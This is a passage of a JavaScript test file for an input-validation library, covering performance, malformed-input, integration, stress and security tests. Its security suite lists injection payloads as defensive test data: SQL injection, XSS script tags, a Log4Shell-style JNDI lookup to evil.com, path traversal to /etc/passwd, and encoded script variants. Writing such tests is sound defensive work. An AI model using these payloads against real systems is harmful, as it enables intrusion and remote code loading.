                    port: env === 'production' ? 80 : 3000,
                    host: env === 'production' ? '0.0.0.0' : 'localhost'
                };
                
                const result = validateConfiguration(config);
                validateTestResult(result instanceof ValidationResult, true, `Should validate ${env} environment`);
            });
        });
    });

    // Performance testing suite
    describe('Performance Tests', { timeout: testConfig.timeouts?.performance || 10000 }, () => {
        
        test('should meet performance thresholds', async () => {
            const testFunctions = [
                { name: 'isValidPort', func: isValidPort, inputs: VALID_PORTS },
                { name: 'isValidHost', func: isValidHost, inputs: VALID_HOSTS },
                { name: 'isValidEnvironment', func: isValidEnvironment, inputs: VALID_ENVIRONMENTS }
            ];
            
            for (const testFunc of testFunctions) {
                const performanceResult = await measureValidationPerformance(
                    testFunc.func,
                    testFunc.inputs,
                    { iterations: 100 }
                );
                
                validateTestResult(typeof performanceResult.averageDuration, 'number', `${testFunc.name} performance measurement`);
                ok(performanceResult.averageDuration < 100, `${testFunc.name} should execute in less than 100ms on average`);
                
                testLogger.info(`Performance test completed for ${testFunc.name}`, {
                    averageDuration: performanceResult.averageDuration,
                    throughput: performanceResult.throughput,
                    iterations: performanceResult.iterations
                });
            }
        });

        test('should handle large input sets', async () => {
            const largeInputSet = Array.from({ length: 1000 }, (_, i) => i + 1000);
            
            const performanceResult = await measureValidationPerformance(
                isValidPort,
                largeInputSet,
                { iterations: 10 }
            );
            
            validateTestResult(performanceResult.success !== false, true, 'Should handle large input sets');
            ok(performanceResult.averageDuration < 1000, 'Large input sets should process within reasonable time');
        });

        test('should maintain performance under load', async () => {
            const concurrentTests = Array.from({ length: 10 }, async () => {
                return measureValidationPerformance(isValidHost, VALID_HOSTS, { iterations: 50 });
            });
            
            const results = await Promise.all(concurrentTests);
            
            results.forEach((result, index) => {
                validateTestResult(result.success !== false, true, `Concurrent test ${index + 1} should succeed`);
                ok(result.averageDuration < 200, `Concurrent test ${index + 1} should maintain performance`);
            });
        });
    });

    // Error handling and edge case testing suite
    describe('Error Handling Tests', () => {
        
        test('should handle error injection gracefully', async () => {
            const functions = [
                { name: 'isValidPort', func: isValidPort },
                { name: 'isValidHost', func: isValidHost },
                { name: 'isValidEnvironment', func: isValidEnvironment }
            ];
            
            for (const testFunc of functions) {
                const errorResult = await testValidationErrorHandling(testFunc.func, {
                    type: 'validation',
                    invalidInputs: [null, undefined, {}, [], 'invalid']
                });
                
                validateTestResult(errorResult.success !== false, true, `${testFunc.name} should handle errors gracefully`);
                validateTestResult(errorResult.totalTests > 0, true, `${testFunc.name} should have test results`);
            }
        });

        test('should maintain stability with malformed inputs', () => {
            const malformedInputs = [
                Symbol('test'),
                function() {},
                new Date(),
                /regex/,
                new Map(),
                new Set()
            ];
            
            malformedInputs.forEach(input => {
                // Test that functions don't throw exceptions with malformed inputs
                try {
                    const portResult = isValidPort(input);
                    const hostResult = isValidHost(input);
                    const envResult = isValidEnvironment(input);
                    
                    // All should handle malformed inputs gracefully
                    validateTestResult(typeof portResult, 'boolean', 'Port validation should return boolean');
                    validateTestResult(typeof hostResult, 'boolean', 'Host validation should return boolean');
                    validateTestResult(typeof envResult, 'boolean', 'Environment validation should return boolean');
                    
                } catch (error) {
                    // If exceptions are thrown, they should be validation errors, not system errors
                    ok(error.name === 'ValidationError' || error instanceof TypeError, 
                       'Should throw appropriate error types for malformed inputs');
                }
            });
        });

        test('should recover from memory pressure', () => {
            // Create large objects to simulate memory pressure
            const largeObjects = Array.from({ length: 100 }, () => ({
                data: new Array(1000).fill('memory-test-data'),
                timestamp: Date.now()
            }));
            
            // Test validation under memory pressure
            largeObjects.forEach((obj, index) => {
                const result = isValidString(`test-${index}`, { maxLength: 100 });
                validateTestResult(result, true, `Validation under memory pressure ${index}`);
            });
            
            // Cleanup
            largeObjects.length = 0;
        });
    });

    // Integration and real-world scenario testing
    describe('Integration Tests', () => {
        
        test('should integrate with Express.js validation middleware', () => {
            // Simulate Express.js request validation scenario
            const mockRequest = {
                body: {
                    port: 3000,
                    host: 'localhost',
                    environment: 'development'
                },
                params: {
                    id: '123'
                },
                query: {
                    format: 'json'
                }
            };
            
            // Validate request data
            const bodyValidation = validateObject(mockRequest.body, {
                port: { type: 'number', min: 1, max: 65535 },
                host: { type: 'string', required: true },
                environment: { type: 'string', enum: VALID_ENVIRONMENTS }
            });
            
            validateTestResult(bodyValidation instanceof ValidationResult, true, 'Should integrate with request validation');
            validateTestResult(bodyValidation.hasErrors(), false, 'Valid request data should pass validation');
        });

        test('should handle real-world validation scenarios', () => {
            const realWorldScenarios = [
                {
                    name: 'User Registration',
                    data: {
                        username: 'john_doe',
                        email: 'john@example.com',
                        password: 'SecureP@ss123',
                        age: 25,
                        termsAccepted: true
                    },
                    schema: {
                        username: { type: 'string', minLength: 3, maxLength: 30, pattern: /^[a-zA-Z0-9_]+$/ },
                        email: { type: 'string', pattern: /^[^\s@]+@[^\s@]+\.[^\s@]+$/ },
                        password: { type: 'string', minLength: 8 },
                        age: { type: 'number', min: 13, max: 120 },
                        termsAccepted: { type: 'boolean', equals: true }
                    }
                },
                {
                    name: 'Server Configuration',
                    data: {
                        port: 8080,
                        host: '0.0.0.0',
                        environment: 'production',
                        ssl: true,
                        maxConnections: 1000
                    },
                    schema: {
                        port: { type: 'number', min: 1, max: 65535 },
                        host: { type: 'string', required: true },
                        environment: { type: 'string', enum: VALID_ENVIRONMENTS },
                        ssl: { type: 'boolean' },
                        maxConnections: { type: 'number', min: 1 }
                    }
                }
            ];
            
            realWorldScenarios.forEach(scenario => {
                const result = validateObject(scenario.data, scenario.schema);
                validateTestResult(result instanceof ValidationResult, true, `${scenario.name} scenario should return ValidationResult`);
                
                testLogger.info(`Real-world scenario test: ${scenario.name}`, {
                    hasErrors: result.hasErrors ? result.hasErrors() : false,
                    errorCount: result.getErrors ? result.getErrors().length : 0
                });
            });
        });

        test('should support validation chaining and composition', () => {
            // Test chaining multiple validations
            const compositeValidation = new ValidationResult();
            
            // Chain multiple validations
            const portValid = isValidPort(3000);
            const hostValid = isValidHost('localhost');
            const envValid = isValidEnvironment('development');
            
            if (!portValid) compositeValidation.addError('port', 'Invalid port');
            if (!hostValid) compositeValidation.addError('host', 'Invalid host');
            if (!envValid) compositeValidation.addError('environment', 'Invalid environment');
            
            validateTestResult(compositeValidation.hasErrors(), false, 'Composite validation should pass for valid inputs');
            
            // Test with invalid inputs
            const invalidComposite = new ValidationResult();
            const invalidPortValid = isValidPort('invalid');
            const invalidHostValid = isValidHost(null);
            const invalidEnvValid = isValidEnvironment('invalid');
            
            if (!invalidPortValid) invalidComposite.addError('port', 'Invalid port');
            if (!invalidHostValid) invalidComposite.addError('host', 'Invalid host');
            if (!invalidEnvValid) invalidComposite.addError('environment', 'Invalid environment');
            
            validateTestResult(invalidComposite.hasErrors(), true, 'Composite validation should fail for invalid inputs');
            validateTestResult(invalidComposite.getErrors().length, 3, 'Should have errors for all invalid inputs');
        });
    });

    // Security-focused testing suite
    describe('Security Tests', () => {
        
        test('should prevent injection attacks', () => {
            const injectionAttempts = [
                "'; DROP TABLE users; --",
                '<script>alert("XSS")</script>',
                '${jndi:ldap://evil.com/a}',
                '../../../etc/passwd',
                'javascript:alert(1)',
                'data:text/html,<script>alert(1)</script>'
            ];
            
            injectionAttempts.forEach(attempt => {
                // Test string validation with potential injection
                const stringResult = isValidString(attempt, { sanitize: true });
                const sanitizedResult = sanitizeInput(attempt);
                
                // Should either reject or safely sanitize
                if (typeof stringResult === 'string') {
                    ok(!stringResult.includes('<script>'), 'Should sanitize script tags');
                    ok(!stringResult.includes('DROP TABLE'), 'Should sanitize SQL injection attempts');
                }
                
                validateTestResult(typeof sanitizedResult, 'string', 'Sanitization should return string');
                ok(!sanitizedResult.includes('<script>'), 'Sanitized output should not contain script tags');
            });
        });

        test('should validate input size limits', () => {
            // Test with extremely large inputs
            const largeString = 'a'.repeat(10000);
            const largeNumber = Number.MAX_SAFE_INTEGER;
            
            const stringResult = isValidString(largeString, { maxLength: 1000 });
            const numberResult = isValidNumber(largeNumber, { max: 1000000 });
            
            validateTestResult(stringResult, false, 'Should reject oversized strings');
            validateTestResult(numberResult, false, 'Should reject oversized numbers');
        });

        test('should handle unicode and encoding attacks', () => {
            const unicodeAttacks = [
                '\u0000', // Null byte
                '\uFEFF', // BOM
                '\u202E', // Right-to-left override
                '\\u003cscript\\u003e', // Encoded script tag
                '%3Cscript%3E', // URL encoded script
                '&#60;script&#62;' // HTML encoded script
            ];
            
            unicodeAttacks.forEach(attack => {
                const sanitized = sanitizeInput(attack);
                const validated = isValidString(attack, { sanitize: true });
                
                // Should handle unicode attacks safely
                validateTestResult(typeof sanitized, 'string', 'Should handle unicode input');
                if (typeof validated === 'string') {
                    ok(!validated.includes('script'), 'Should not contain script after validation');
                }
            });
        });
    });

    // Comprehensive integration and stress testing
    describe('Stress Tests', { timeout: testConfig.timeouts?.stress || 30000 }, () => {
        
        test('should handle high-volume validation requests', async () => {
            const highVolumeData = Array.from({ length: 10000 }, (_, i) => ({
                port: 3000 + (i % 1000),
                host: `host${i % 100}.example.com`,
                environment: VALID_ENVIRONMENTS[i % VALID_ENVIRONMENTS.length]
            }));
            
            const startTime = Date.now();
            let successCount = 0;
            let errorCount = 0;
            
            for (const data of highVolumeData) {
                try {
                    const portValid = isValidPort(data.port);
                    const hostValid = isValidHost(data.host);
                    const envValid = isValidEnvironment(data.environment);
                    
                    if (portValid && hostValid && envValid) {
                        successCount++;
                    } else {
                        errorCount++;
                    }
                } catch (error) {
                    errorCount++;
                }
            }
            
            const duration = Date.now() - startTime;
            const throughput = (highVolumeData.length / duration) * 1000; // items per second
            
            testLogger.info('High-volume validation test completed', {
                totalItems: highVolumeData.length,
                successCount: successCount,
                errorCount: errorCount,
                duration: duration,
                throughput: throughput
            });
            
            validateTestResult(successCount > 0, true, 'Should have successful validations');
            ok(throughput > 100, 'Should maintain reasonable throughput (>100 items/sec)');
        });

        test('should maintain memory efficiency', () => {
            const initialMemory = process.memoryUsage();
            
            // Perform many validation operations
            for (let i = 0; i < 1000; i++) {
                const validationResult = new ValidationResult();
                validationResult.addError(`field${i}`, `Error ${i}`);
                
                isValidPort(3000 + i);
                isValidHost(`host${i}.example.com`);
                isValidEnvironment(VALID_ENVIRONMENTS[i % VALID_ENVIRONMENTS.length]);
                
                sanitizeInput(`<div>Test content ${i}</div>`);
            }
            
            // Force garbage collection if available
            if (global.gc) {
                global.gc();
            }
            
            const finalMemory = process.memoryUsage();
            const memoryIncrease = finalMemory.heapUsed - initialMemory.heapUsed;
            
            testLogger.info('Memory efficiency test completed', {
                initialMemory: initialMemory.heapUsed,
                finalMemory: finalMemory.heapUsed,
                memoryIncrease: memoryIncrease,
                memoryIncreasePercent: ((memoryIncrease / initialMemory.heapUsed) * 100).toFixed(2)
            });
            
            // Memory increase should be reasonable (less than 100% increase)
            ok(memoryIncrease < initialMemory.heapUsed, 'Memory usage should not double during validation operations');
        });
    });
});

// Export test utilities for potential use in other test files
module.exports = {
    setupTestEnvironment,
    cleanupTestEnvironment,
    createValidationTestData,
    validateTestResult,
    measureValidationPerformance,
    testValidationErrorHandling,
    testUtilities,
    testLogger
};